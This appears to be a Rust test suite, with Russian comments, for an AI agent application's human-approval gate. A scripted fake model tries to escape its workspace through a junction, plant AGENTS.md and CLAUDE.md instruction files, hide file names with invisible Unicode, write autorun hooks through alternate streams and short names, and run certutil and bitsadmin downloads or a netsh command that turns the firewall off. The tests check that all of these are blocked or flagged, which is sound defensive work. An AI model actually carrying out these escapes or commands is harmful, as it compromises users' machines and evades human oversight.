    std::fs::write(&secret, "ВЕРХНИЙ-СЕКРЕТ-Y").unwrap();
    let mut calls = vec![
        tool("read_file", json!({ "path": secret.display().to_string() })),
        tool("read_file", json!({ "path": format!("../team_{}/secret.txt", rooms[1]) })),
        tool("write_file", json!({ "path": secret.display().to_string(), "content": "перезапись" })),
        tool("write_file", json!({ "path": format!("../team_{}/new.txt", rooms[1]), "content": "x" })),
    ];
    // Junction из своей папки в чужую: путь выглядит своим, а ведёт наружу.
    let link = team_x.join("door");
    let made = std::process::Command::new("cmd").args(["/c", "mklink", "/J"]).arg(&link).arg(&team_y).output().map(|o| o.status.success()).unwrap_or(false);
    if made {
        calls.push(tool("read_file", json!({ "path": "door/secret.txt" })));
        calls.push(tool("write_file", json!({ "path": "door/new.txt", "content": "x" })));
    }
    turn_calls(&crew, &fake, &ids[0], calls).await;
    assert_eq!(std::fs::read_to_string(&secret).unwrap(), "ВЕРХНИЙ-СЕКРЕТ-Y", "чужой файл не перезаписан");
    assert!(!team_y.join("new.txt").exists(), "в чужую папку ничего не записано");
    let seen = serde_json::to_string(&*fake.requests.lock().unwrap()).unwrap();
    assert!(!seen.contains("ВЕРХНИЙ-СЕКРЕТ-Y"), "содержимое чужой папки дошло до модели");
    if made {
        let _ = std::process::Command::new("cmd").args(["/c", "rmdir"]).arg(&link).output();
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_bot_cannot_plant_instructions_in_the_team_folder() {
    let (crew, fake, _first) = setup("ap-team-plant", &[]).await;
    let bot = crew.ok("POST", "/api/bots", Some(json!({ "name": "Автор-тест", "role": "р", "approval": "ask" }))).await["bot"]["id"].as_str().unwrap().to_string();
    let room = crew.ok("POST", "/api/rooms", Some(json!({ "name": "Редакция", "botIds": [bot], "lead": bot }))).await["room"]["id"].as_str().unwrap().to_string();
    let team = crew.data_dir.join("workspaces").join(format!("team_{room}"));
    assert!(team.is_dir(), "общая папка готова сразу после создания команды");
    let cards = turn_calls(
        &crew,
        &fake,
        &bot,
        vec![
            tool("write_file", json!({ "path": "AGENTS.md", "content": "planted" })),
            tool("write_file", json!({ "path": "CLAUDE.md", "content": "planted" })),
            tool("write_file", json!({ "path": "sub/AGENTS.md", "content": "planted" })),
            tool("write_file", json!({ "path": "tools/run.ps1", "content": "planted" })),
            tool("run_command", json!({ "command": "echo planted > AGENTS.md" })),
            tool("run_command", json!({ "command": "echo planted > sub\\AGENTS.md." })),
            tool("run_command", json!({ "command": "echo planted > \"CLAUDE.md \"" })),
            tool("write_file", json!({ "path": "GEMINI.md", "content": "planted" })),
            tool("write_file", json!({ "path": "AGENTS.md.", "content": "planted" })),
        ],
    )
    .await;
    for planted in ["AGENTS.md", "CLAUDE.md", "sub/AGENTS.md", "tools/run.ps1", "sub/AGENTS.md.", "GEMINI.md"] {
        assert!(!team.join(planted).exists(), "{planted} подложен в общую папку");
    }
    assert!(cards.len() >= 5, "вложенные инструкции, сценарии и команда в общей папке идут с карточкой: {cards:?}");
}

#[tokio::test(flavor = "multi_thread")]
async fn invisible_and_direction_characters_are_not_shown_and_an_unparsed_command_is_always_high() {
    let (crew, fake, bot) = setup("ap-odd-chars", &[]).await;
    set_mode(&crew, &bot, "strict").await;
    let odd = "ab\u{202E}cod.txt\u{200B}";
    let with = tool("write_file", json!({ "path": format!("{odd}"), "content": "x", "purpose": "обычно\u{202E}fdp.exe\u{200B} зачем" }));
    let cards = turn_calls(&crew, &fake, &bot, vec![with]).await;
    let human = &cards[0]["human"];
    for field in ["text", "textEn", "purpose"] {
        let shown = human[field].as_str().unwrap();
        assert!(!shown.contains('\u{202E}') && !shown.contains('\u{200B}'), "{field}: {shown}");
    }
    assert!(cards[0]["detail"].as_str().unwrap().contains("⟦U+202E⟧"), "в деталях знаки видны кодом: {}", cards[0]["detail"]);

    // Непонятная команда: всегда высокий риск, имён файлов из неё в фразе нет, виден список известных опасных программ.
    let table = [
        (q("Set-Content -LiteralPath 'harmless.txt' -Value 'x'; $a = 1; Set-Content $env:TEMP\\evil.txt $a"), "пути не определены"),
        (q("Set-Content 'decoy.txt' x; foo"), "пути не определены"),
        ("certutil -urlcache -f https://example.com/a.exe a.exe".to_string(), "certutil"),
        ("bitsadmin /transfer j https://example.com/a a".to_string(), "bitsadmin"),
        ("reg add HKCU\\Software\\x /v a /d 1".to_string(), "reg"),
        ("sc create svc binPath= x".to_string(), "sc"),
        ("schtasks /create /tn x /tr y".to_string(), "schtasks"),
        ("netsh advfirewall set allprofiles state off".to_string(), "netsh"),
    ];
    for (command, phrase) in table {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": command }))]).await;
        assert_eq!(cards.len(), 1, "{command}");
        let human = &cards[0]["human"];
        assert_eq!(human["risk"], "high", "{command}: {human}");
        assert!(human["text"].as_str().unwrap().contains(phrase), "{command}: {human}");
        assert!(!human["text"].as_str().unwrap().contains("decoy.txt") && !human["text"].as_str().unwrap().contains("harmless.txt"), "{human}");
    }
}

// --- раунд 3: назначение-папка, свои автозапуски через write_file, подложенные программы, окружение команд ------

#[tokio::test(flavor = "multi_thread")]
async fn copying_or_moving_into_a_guarded_folder_asks_for_every_pair() {
    let (crew, fake, bot) = setup("ap-move-guard", &[]).await;
    let dir = outside("move-guard");
    let team = dir.join("a");
    std::fs::create_dir_all(team.join("tools")).unwrap();
    let room = make_team(&crew, &[bot.as_str()], &team).await;
    let ws = team_workspace(&crew, &room);
    for dir in [".claude", ".cargo", ".vscode", ".git/hooks", "tools"] {
        std::fs::create_dir_all(ws.join(dir.replace('/', "\\"))).unwrap();
    }
    let team_path = plain(&team);
    // (источник, назначение): назначение — существующая папка, слеш на конце или несуществующая папка с охраняемым именем файла.
    let pairs: Vec<(&str, String, &str)> = vec![
        ("settings.json", ".claude".into(), ".claude\\settings.json"),
        ("config.toml", ".cargo".into(), ".cargo\\config.toml"),
        ("tasks.json", ".vscode".into(), ".vscode\\tasks.json"),
        ("pre-commit", ".git\\hooks".into(), ".git\\hooks\\pre-commit"),
        ("x.ps1", "tools".into(), "tools\\x.ps1"),
        ("settings.json", ".claude\\".into(), ".claude\\settings.json"),
        ("settings.json", ".claude/".into(), ".claude\\settings.json"),
        ("package.json", "sub".into(), "sub\\package.json"),
        ("AGENTS.md", team_path.clone(), "AGENTS.md"),
        ("CLAUDE.md", format!("{team_path}\\"), "CLAUDE.md"),
        ("x.ps1", format!("{team_path}\\tools"), "tools\\x.ps1"),
    ];
    for (verb, extra) in [("Move-Item", ""), ("Copy-Item", "")] {
        let _ = extra;
        for (src, dest, landed) in &pairs {
            std::fs::write(ws.join(src), "x").unwrap();
            let script = format!("Set-Content -LiteralPath '{src}' -Value 'x'; {verb} -LiteralPath '{src}' -Destination '{dest}'");
            let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(&script) }))]).await;
            assert_eq!(cards.len(), 1, "{verb} {src} -> {dest} прошёл без карточки");
            let base = if dest.starts_with(&team_path) { &team } else { &ws };
            assert!(!base.join(landed).exists(), "{verb}: {landed} появился в {}", base.display());
            let _ = std::fs::remove_file(ws.join(src));
        }
    }
    // Папка, созданная тем же скриптом, и перенос в неё: карточка.
    let script = "New-Item -ItemType Directory -Path 'hooks2'; Set-Content -LiteralPath 'p.txt' -Value 'x'; Move-Item -LiteralPath 'p.txt' -Destination 'hooks2'";
    assert_eq!(turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(script) }))]).await.len(), 1);
    // Обычный перенос файла в обычный файл без карточки.
    std::fs::write(ws.join("a.txt"), "x").unwrap();
    let script = "Copy-Item -LiteralPath 'a.txt' -Destination 'b.txt'";
    assert!(turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(script) }))]).await.is_empty());
    assert!(ws.join("b.txt").exists());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn write_file_in_the_own_folder_asks_for_autorun_files_but_not_for_notes() {
    let (crew, fake, bot) = setup("ap-write-autorun", &[]).await;
    for rel in [".claude/settings.json", ".mcp.json", ".git/hooks/pre-commit", ".git/config", ".cargo/config.toml", ".vscode/tasks.json", "package.json", ".claude/skills/a/SKILL.md", "opencode.json", ".windsurf/rules.md", ".aider.conf.yml", ".continue/config.json"] {
        let cards = turn_calls(&crew, &fake, &bot, vec![write(std::path::Path::new(&rel.replace('/', "\\")))]).await;
        assert_eq!(cards.len(), 1, "write_file {rel} без карточки");
    }
    for rel in ["notes\\a.md", "report.md", "data\\x.json", "src\\main.py"] {
        assert!(turn_calls(&crew, &fake, &bot, vec![write(std::path::Path::new(rel))]).await.is_empty(), "{rel} спрашивает зря");
    }
    // «Решай сам»: обычные файлы без вопроса, файл автозапуска всё равно с карточкой (пол main: `special_write_guard`).
    set_mode(&crew, &bot, "auto").await;
    assert!(turn_calls(&crew, &fake, &bot, vec![write(std::path::Path::new("report.md"))]).await.is_empty());
    assert_eq!(turn_calls(&crew, &fake, &bot, vec![write(std::path::Path::new(".mcp.json"))]).await.len(), 1);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_script_cannot_create_runnable_files_and_every_command_gets_the_exe_search_guard() {
    let (crew, fake, bot) = setup("ap-planted-exe", &[]).await;
    let ws = crew.data_dir.join("workspaces").join(&bot);
    std::fs::create_dir_all(&ws).unwrap();
    for name in ["git.exe", "tool.exe", "a.bat", "run.cmd", "x.ps1", "m.psm1", "l.lnk", "s.vbs", "r.js", "w.wsf", "d.dll", "h.hta", "j.jar", "c.com", "pwsh", "cmd.exe", "powershell.bat", "u.url"] {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(&format!("Set-Content -LiteralPath '{name}' -Value 'x'")) }))]).await;
        assert_eq!(cards.len(), 1, "{name}");
        assert!(!ws.join(name).exists(), "{name} записан");
    }
    for name in ["a.py", "a.md", "data.json", "r.txt", "page.html"] {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(&format!("Set-Content -LiteralPath '{name}' -Value 'x'")) }))]).await;
        assert!(cards.is_empty(), "{name} спрашивает зря");
    }
    // Дочерний процесс видит защиту от поиска программ в текущей папке (читаем его окружение, не нашу).
    turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": "set NoDefaultCurrentDirectoryInExePath" }))]).await;
    let update = crew.events.lock().unwrap().iter().rev().find(|e| e["type"] == "tool_update").cloned().unwrap();
    assert!(update["result"].as_str().unwrap().contains("NoDefaultCurrentDirectoryInExePath=1"), "{update}");
}

// --- раунд 4: потоки файла и короткие имена, причины в карточке, общий список запускаемых файлов -------------

#[tokio::test(flavor = "multi_thread")]
async fn stream_suffixes_and_short_names_do_not_get_past_the_autorun_guard_in_write_file() {
    let (crew, fake, bot) = setup("ap-spelling", &[]).await;
    let ws = crew.data_dir.join("workspaces").join(&bot);
    std::fs::create_dir_all(ws.join(".claude")).unwrap();
    std::fs::write(ws.join("package.json"), "orig").unwrap();
    std::fs::write(ws.join(".npmrc"), "orig").unwrap();
    std::fs::write(ws.join(".mcp.json"), "orig").unwrap();
    std::fs::write(ws.join(".claude").join("settings.json"), "orig").unwrap();
    // Абсолютный путь с потоком `::$DATA` или `:поток`: принять нельзя ни молча, ни с карточкой, файл не меняется.
    for rel in [".claude\\settings.json::$DATA", "package.json::$DATA", ".npmrc::$DATA", ".mcp.json::$DATA", "notes.md::$DATA", "package.json:evil", ".claude\\settings.json:x:$DATA"] {
        let path = ws.join(rel);
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("write_file", json!({ "path": path.display().to_string(), "content": "PWNED" }))]).await;
        let last = crew.events.lock().unwrap().iter().rev().find(|e| e["type"] == "tool_update").cloned().unwrap();
        assert!(cards.len() == 1 || last["status"] != "ok", "{rel} записан без вопроса: {last}");
    }
    for name in ["package.json", ".npmrc", ".mcp.json"] {
        assert_eq!(std::fs::read_to_string(ws.join(name)).unwrap(), "orig", "{name} перезаписан через поток");
    }
    assert_eq!(std::fs::read_to_string(ws.join(".claude").join("settings.json")).unwrap(), "orig");
    // Относительный путь через короткое имя 8.3 или хвостовые точки: карточка, ничего не записано.
    for rel in ["GIT~1/hooks/pre-commit", "CLAUDE~1/settings.json", "PACKAG~1.JSO", "dir~2/x.txt", ".claude./settings.json", ".claude /settings.json"] {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("write_file", json!({ "path": rel, "content": "PWNED" }))]).await;
        let last = crew.events.lock().unwrap().iter().rev().find(|e| e["type"] == "tool_update").cloned().unwrap();
        assert!(cards.len() == 1 || last["status"] != "ok", "{rel} записан без вопроса");
    }
    assert_eq!(std::fs::read_to_string(ws.join("package.json")).unwrap(), "orig");
    // Обычные заметки и данные идут без карточки, и по относительному, и по абсолютному пути.
    for rel in ["notes\\a.md", "Report.md", "data.json", "x.py", "page.html", "r.txt", "style.css", "src\\lib.rs"] {
        assert!(turn_calls(&crew, &fake, &bot, vec![write(std::path::Path::new(rel))]).await.is_empty(), "{rel} спрашивает зря");
        assert!(turn_calls(&crew, &fake, &bot, vec![write(&ws.join(rel))]).await.is_empty(), "абсолютный {rel} спрашивает зря");
    }
    // Запускаемые файлы тоже спрашивают, как и в скриптах.
    for rel in ["git.bat", "pwsh.cmd", "x.vbs", "x.js", "x.url", "tool.exe", "l.lnk"] {
        assert_eq!(turn_calls(&crew, &fake, &bot, vec![write(std::path::Path::new(rel))]).await.len(), 1, "write_file {rel} без карточки");
        assert!(!ws.join(rel).exists(), "{rel} записан");
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_card_for_a_guarded_write_says_why_and_is_high_risk() {
    let (crew, fake, bot) = setup("ap-reasons", &[]).await;
    let ws = crew.data_dir.join("workspaces").join(&bot);
    std::fs::create_dir_all(ws.join(".git").join("hooks")).unwrap();
    std::fs::create_dir_all(ws.join("tools")).unwrap();
    let table = [
        ("package.json", "запускается сам"),
        (".mcp.json", "запускается сам"),
        (".git/hooks/pre-commit", "git"),
        ("x.js", "запускаемый файл"),
        ("GIT~1/hooks/pre-commit", "необычно"),
    ];
    for (rel, phrase) in table {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("write_file", json!({ "path": rel.replace('/', "\\"), "content": "x" }))]).await;
        let human = &cards[0]["human"];
        assert!(human["text"].as_str().unwrap().contains(phrase), "{rel}: {human}");
        assert_eq!(human["risk"], "high", "{rel}");
        assert!(human["textEn"].as_str().unwrap().contains("Confirm only if"), "{rel}: {human}");
    }
    // Скрипты: запускаемый файл, назначение-папка и папка, созданная тем же скриптом.
    std::fs::write(ws.join("src.txt"), "x").unwrap();
    let table = [
        ("Set-Content -LiteralPath 'git.exe' -Value 'x'", "запускаемый файл"),
        ("Set-Content -LiteralPath 'a.js' -Value 'x'", "запускаемый файл"),
        ("Copy-Item -LiteralPath 'src.txt' -Destination 'tools'", "Назначение: папка"),
        ("New-Item -ItemType Directory -Path 'h2'; Set-Content -LiteralPath 'p.txt' -Value 'x'; Move-Item -LiteralPath 'p.txt' -Destination 'h2'", "создаёт папку"),
        ("Set-Content -LiteralPath '.claude/settings.json' -Value 'x'", "запускается сам"),
    ];
    for (script, phrase) in table {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(script) }))]).await;
        assert_eq!(cards.len(), 1, "{script}");
        let human = &cards[0]["human"];
        assert!(human["text"].as_str().unwrap().contains(phrase), "{script}: {human}");
        assert_eq!(human["risk"], "high", "{script}");
    }
    // Обычная запись заметки: без причины и с низким риском.
    let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q("Set-Content -LiteralPath 'r.txt' -Value 'x'; Set-Content -LiteralPath 'C:/Users/Public/deloist-no.txt' -Value 'y'") }))]).await;
    assert_eq!(cards.len(), 1);
    assert!(!cards[0]["human"]["text"].as_str().unwrap().contains("Подтверждай"), "{}", cards[0]["human"]);
}

// ---------------------------------------------------------------------------
// Карточка без ответа не теряется
// ---------------------------------------------------------------------------

const SHORT: &[(&str, &str)] = &[("CREW_TEST_APPROVAL_WAIT_MS", "300")];

fn runs_file(crew: &Crew) -> Vec<Value> {
    serde_json::from_str(&std::fs::read_to_string(crew.data_dir.join("runs.json")).unwrap_or_else(|_| "[]".into())).unwrap()
}

/// Записи журнала, которые ведут задачи команды (ход ведущего человека сюда не входит).
fn team_runs(crew: &Crew) -> Vec<Value> {
    runs_file(crew).into_iter().filter(|r| r["origin"].get("team").is_some()).collect()
}

fn texts(thread: &Value) -> Vec<String> {
    thread["messages"].as_array().cloned().unwrap_or_default().iter().filter_map(|m| m["text"].as_str().map(str::to_string)).collect()
}

/// Первое сообщение, которое бот получил от программы с таким началом.
fn sent_note(fake: &Fake, start: &str) -> Option<String> {
    let requests = fake.requests.lock().unwrap();
    requests.iter().flat_map(|r| r["messages"].as_array().cloned().unwrap_or_default()).filter_map(|m| m["content"].as_str().map(str::to_string)).find(|c| c.starts_with(start))
}

/// Ход упёрся в карточку, человек молчит: ход закрыт, карточка осталась. Возвращает номер карточки.
async fn leave_unanswered(crew: &Crew, fake: &Fake, bot: &str, call: Value) -> String {
    *fake.script.lock().unwrap() = vec![call, say("это не должно прозвучать")];
    crew.clear_events();
    crew.say(bot, "сделай").await;
    let card = crew.wait_event("карточка", |e| e["type"] == "approval").await;
    crew.wait_event("конец хода", |e| e["type"] == "turn_end").await;
    card["id"].as_str().unwrap().to_string()
}

#[tokio::test(flavor = "multi_thread")]
async fn an_unanswered_card_ends_the_turn_and_waits_for_the_human() {
    let (crew, fake, bot) = setup("ap-wait", SHORT).await;
    let dir = outside("wait");
    let file = dir.join("a").join("x.txt");
    let id = leave_unanswered(&crew, &fake, &bot, write(&file)).await;

    assert_eq!(fake.requests.lock().unwrap().len(), 1, "после карточки модель больше не зовут: ход остановлен");
    let list = needs(&crew).await;
    assert_eq!(list["count"], 1, "{list}");
    assert_eq!(list["items"][0]["id"], id.as_str());
    assert_eq!(list["items"][0]["kind"], "approval", "запись хода отдельной строкой не идёт: {list}");
    let pending = crew.ok("GET", &format!("/api/bots/{bot}/pending"), None).await;
    assert_eq!(pending["pending"].as_array().unwrap().len(), 1, "{pending}");
    assert!(crew.find_event(|e| e["type"] == "approval_closed").is_none(), "карточка не закрыта по времени");
    let runs = runs_file(&crew);
    assert_eq!(runs[0]["state"]["kind"], "needs_human", "{runs:?}");
    assert_eq!(runs[0]["state"]["reason"], "human");
    let said = texts(&crew.ok("GET", &format!("/api/bots/{bot}/thread?limit=50"), None).await);
    assert!(said.iter().all(|t| !t.contains("Человек не разрешил") && !t.contains("не должно прозвучать")), "{said:?}");
    assert!(!file.exists());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_late_allow_runs_exactly_that_call_once_and_a_different_one_asks_again() {
    let (crew, fake, bot) = setup("ap-late", SHORT).await;
    let dir = outside("late");
    let (a, b) = (dir.join("a").join("one.txt"), dir.join("a").join("two.txt"));
    let id = leave_unanswered(&crew, &fake, &bot, write(&a)).await;

    // Продолжение: то же действие, потом такое же ещё раз, потом другое.
    *fake.script.lock().unwrap() = vec![write(&a), write(&a), write(&b), say("дошёл")];
    crew.clear_events();
    crew.ok("POST", &format!("/api/approvals/{id}"), Some(json!({ "answer": "once" }))).await;
    let again = crew.wait_event("карточка на повтор", |e| e["type"] == "approval").await;
    assert!(a.exists(), "позднее «да» выполнило вызов без новой карточки");
    assert!(sent_note(&fake, "Человек разрешил:").is_some_and(|n| n.contains("Выполни это действие")), "бот получил решение первым сообщением");
    // Второй такой же вызов разовым разрешением не покрыт.
    assert!(!b.exists());
    crew.ok("POST", &format!("/api/approvals/{}", again["id"].as_str().unwrap()), Some(json!({ "answer": "deny" }))).await;
    let next = crew.wait_event("карточка на другое", |e| e["type"] == "approval" && e["id"] != again["id"]).await;
    crew.ok("POST", &format!("/api/approvals/{}", next["id"].as_str().unwrap()), Some(json!({ "answer": "deny" }))).await;
    crew.wait_event("конец хода", |e| e["type"] == "turn_end").await;
    assert!(!b.exists());
    let runs = runs_file(&crew);
    assert_eq!(runs.len(), 1, "запись та же, новой нет");
    assert_eq!(runs[0]["state"]["kind"], "done");
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_late_deny_continues_without_the_action() {
    let (crew, fake, bot) = setup("ap-deny", SHORT).await;
    let dir = outside("deny");
    let file = dir.join("a").join("x.txt");
    let id = leave_unanswered(&crew, &fake, &bot, write(&file)).await;
    *fake.script.lock().unwrap() = vec![say("обойдусь без этого")];
    crew.clear_events();
    crew.ok("POST", &format!("/api/approvals/{id}"), Some(json!({ "answer": "deny" }))).await;
    crew.wait_event("конец хода", |e| e["type"] == "turn_end").await;
    assert!(sent_note(&fake, "Человек запретил:").is_some_and(|n| n.contains("без этого действия")));
    assert!(!file.exists());
    assert_eq!(needs(&crew).await["count"], 0);
    assert_eq!(runs_file(&crew)[0]["state"]["kind"], "done");
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_card_survives_a_restart_and_the_late_decision_still_continues_the_run() {
    let (mut crew, fake, bot) = setup("ap-restart-card", SHORT).await;
    let dir = outside("restart-card");
    let file = dir.join("a").join("x.txt");
    let id = leave_unanswered(&crew, &fake, &bot, write(&file)).await;
    let saved: Value = serde_json::from_str(&std::fs::read_to_string(crew.data_dir.join("approvals.json")).unwrap()).unwrap();
    assert!(saved[&id]["payload"]["detail"].as_str().unwrap().contains("x.txt"), "на диске то же, что видел человек: {saved}");
    assert!(!saved.to_string().contains("\"content\""), "аргументы вызова на диск не пишутся: {saved}");

    crew.keep_data();
    let data = crew.data_dir.clone();
    drop(crew);
    let crew = Crew::start_at(data, SHORT).await;
    crew.listen().await;
    let list = needs(&crew).await;
    assert_eq!(list["count"], 1, "{list}");
    assert_eq!(list["items"][0]["id"], id.as_str());
    let pending = crew.ok("GET", &format!("/api/bots/{bot}/pending"), None).await;
    assert_eq!(pending["pending"][0]["detail"], saved[&id]["payload"]["detail"]);
    assert_eq!(runs_file(&crew)[0]["state"]["kind"], "needs_human", "после перезапуска ход сам не стартует");

    *fake.script.lock().unwrap() = vec![write(&file), say("готово")];
    crew.clear_events();
    crew.ok("POST", &format!("/api/approvals/{id}"), Some(json!({ "answer": "once" }))).await;
    crew.wait_event("конец хода", |e| e["type"] == "turn_end").await;
    assert!(file.exists());
    assert!(crew.find_event(|e| e["type"] == "approval").is_none(), "новой карточки нет");
    assert_eq!(needs(&crew).await["count"], 0);
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn the_program_key_cannot_decide_a_waiting_card() {
    let (crew, fake, bot) = setup("ap-key", SHORT).await;
    let dir = outside("key");
    let id = leave_unanswered(&crew, &fake, &bot, write(&dir.join("a").join("x.txt"))).await;
    let runtime: Value = serde_json::from_str(&std::fs::read_to_string(crew.data_dir.join("runtime.json")).unwrap()).unwrap();
    let token = runtime["token"].as_str().unwrap().to_string();
    let response = crew.client.post(format!("{}/api/approvals/{id}", crew.base)).bearer_auth(&token).json(&json!({ "answer": "always" })).send().await.unwrap();
    assert_eq!(response.status().as_u16(), 403);
    assert_eq!(needs(&crew).await["count"], 1, "карточка на месте");
    assert!(crew.ok("GET", "/api/permissions", None).await["rules"].as_array().unwrap().is_empty());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_one_shot_grant_does_not_open_the_same_call_in_another_run() {
    let (crew, fake, bot) = setup("ap-other-run", SHORT).await;
    let dir = outside("other-run");
    let file = dir.join("a").join("x.txt");
    let id = leave_unanswered(&crew, &fake, &bot, write(&file)).await;
    // Продолжение само ничего не вызывает: разрешение остаётся неиспользованным в запуске, который уже закрыт.
    *fake.script.lock().unwrap() = vec![say("понял, ничего не делаю")];
    crew.clear_events();
    crew.ok("POST", &format!("/api/approvals/{id}"), Some(json!({ "answer": "once" }))).await;
    crew.wait_event("конец хода", |e| e["type"] == "turn_end").await;

    // Новый ход с тем же вызовом — другой запуск: спрашивает заново.
    *fake.script.lock().unwrap() = vec![write(&file), say("готово")];
    crew.clear_events();
    crew.say(&bot, "сделай ещё раз").await;
    let card = crew.wait_event("новая карточка", |e| e["type"] == "approval").await;
    assert!(!file.exists());
    crew.ok("POST", &format!("/api/approvals/{}", card["id"].as_str().unwrap()), Some(json!({ "answer": "deny" }))).await;
    crew.wait_event("конец хода", |e| e["type"] == "turn_end").await;
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_card_without_a_decision_reminds_once() {
    let sink = PathBuf::from(env!("CARGO_TARGET_TMPDIR")).join(format!("approvals-remind-{}.jsonl", std::process::id()));
    let _ = std::fs::remove_file(&sink);
    let (crew, fake, bot) = setup(
        "ap-remind",
        &[("CREW_TEST_APPROVAL_WAIT_MS", "200"), ("CREW_TEST_REMIND_AFTER_MS", "1200"), ("CREW_TEST_TOAST_SINK", sink.to_str().unwrap())],
    )
    .await;
    let dir = outside("remind");
    leave_unanswered(&crew, &fake, &bot, write(&dir.join("a").join("x.txt"))).await;
    let reminders = || std::fs::read_to_string(&sink).unwrap_or_default().lines().filter(|l| l.contains("\"show\"") && (l.contains("ждёт твоего решения") || l.contains("is waiting"))).count();
    common::wait_until("напоминание", 20, || async { reminders() == 1 }).await;
    tokio::time::sleep(std::time::Duration::from_millis(2500)).await;
    assert_eq!(reminders(), 1, "второго напоминания нет");
    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::remove_file(&sink);
}

// ---------------------------------------------------------------------------
// Задача команды: карточка у исполнителя
// ---------------------------------------------------------------------------

/// Модель, у которой свой сценарий на каждого бота: ведущий и исполнитель работают одновременно.
#[derive(Clone, Default)]
struct Named {
    scripts: Arc<Mutex<std::collections::HashMap<String, Vec<Value>>>>,
    requests: Arc<Mutex<Vec<(String, Value)>>>,
}

async fn named_completions(State(fake): State<Named>, body: Bytes) -> Response {
    let request: Value = serde_json::from_slice(&body).unwrap();
    if request.get("tools").is_none() {
        return Json(json!({ "choices": [{ "message": say("{\"ops\": []}") }] })).into_response();
    }
    let system = request["messages"][0]["content"].as_str().unwrap_or_default().to_string();
    // Сценарий ищется по имени бота из строки «Ты — Имя, роль.».
    let who = system.split("Ты — ").nth(1).and_then(|rest| rest.split(',').next()).unwrap_or_default().to_string();
    fake.requests.lock().unwrap().push((who.clone(), request));
    let message = {
        let mut scripts = fake.scripts.lock().unwrap();
        let list = scripts.entry(who).or_default();
        if list.is_empty() { say("готово") } else { list.remove(0) }
    };
    Json(json!({ "choices": [{ "message": message }] })).into_response()
}

impl Named {
    fn script(&self, who: &str, steps: Vec<Value>) {
        self.scripts.lock().unwrap().insert(who.to_string(), steps);
    }
}

struct TeamSetup {
    crew: Crew,
    fake: Named,
    alpha: String,
    dir: PathBuf,
}

/// Сервер с моделью по именам ботов и сессия, которая слушает события.
async fn named_crew(name: &str, env: &[(&str, &str)]) -> (Crew, Named) {
    let fake = Named::default();
    let router = Router::new().route("/v1/chat/completions", post(named_completions)).with_state(fake.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move { axum::serve(listener, router).await.unwrap() });
    let crew = Crew::start_with_env(name, env).await;
    crew.ok("PUT", "/api/settings", Some(json!({ "driver": "api", "baseUrl": format!("http://127.0.0.1:{port}/v1"), "apiKey": "k" }))).await;
    crew.listen().await;
    (crew, fake)
}

async fn named_bots(crew: &Crew, bots: &[(&str, &str)]) -> Vec<String> {
    let mut ids = Vec::new();
    for (name, mode) in bots {
        ids.push(crew.ok("POST", "/api/bots", Some(json!({ "name": name, "role": "р", "approval": mode }))).await["bot"]["id"].as_str().unwrap().to_string());
    }
    ids
}

async fn team_setup(name: &str) -> TeamSetup {
    let (crew, fake) = named_crew(name, SHORT).await;
    let mut ids = Vec::new();
    for (bot, role, mode) in [("Альфа", "ведущий", "auto"), ("Бета", "картинки", "ask")] {
        let id = crew.ok("POST", "/api/bots", Some(json!({ "name": bot, "role": role, "approval": mode }))).await["bot"]["id"].as_str().unwrap().to_string();
        ids.push(id);
    }
    crew.ok("POST", "/api/rooms", Some(json!({ "name": "Редакция", "botIds": [ids[0], ids[1]], "lead": ids[0] }))).await;
    TeamSetup { crew, fake, alpha: ids[0].clone(), dir: outside(name) }
}

impl TeamSetup {
    fn tasks(&self) -> Vec<Value> {
        serde_json::from_str(&std::fs::read_to_string(self.crew.data_dir.join("team_tasks.json")).unwrap_or_else(|_| "[]".into())).unwrap()
    }

    fn script(&self, who: &str, steps: Vec<Value>) {
        self.fake.script(who, steps);
    }

    fn beta_saw(&self, text: &str) -> bool {
        self.fake.requests.lock().unwrap().iter().filter(|(who, _)| who == "Бета").any(|(_, r)| r.to_string().contains(text))
    }

    /// Исполнитель упёрся в карточку без ответа: задача закрыта как прерванная, запись ждёт человека.
    async fn start_and_wait_for_the_card(&self, file: &std::path::Path) -> String {
        self.script("Альфа", vec![tool("assign_task", json!({ "bot": "Бета", "text": "сделай запись" })), say("поручил")]);
        self.script("Бета", vec![write(file), say("это не должно прозвучать")]);
        self.crew.clear_events();
        self.crew.say(&self.alpha, "поручи").await;
        let card = self.crew.wait_event("карточка исполнителя", |e| e["type"] == "approval").await;
        common::wait_until("задача прервана", 30, || async { self.tasks().first().is_some_and(|t| t["state"] == "interrupted") }).await;
        assert_eq!(team_runs(&self.crew)[0]["state"]["kind"], "needs_human");
        card["id"].as_str().unwrap().to_string()
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_team_task_continues_on_the_same_run_after_a_late_allow() {
    let t = team_setup("ap-team-allow").await;
    let file = t.dir.join("a").join("x.txt");
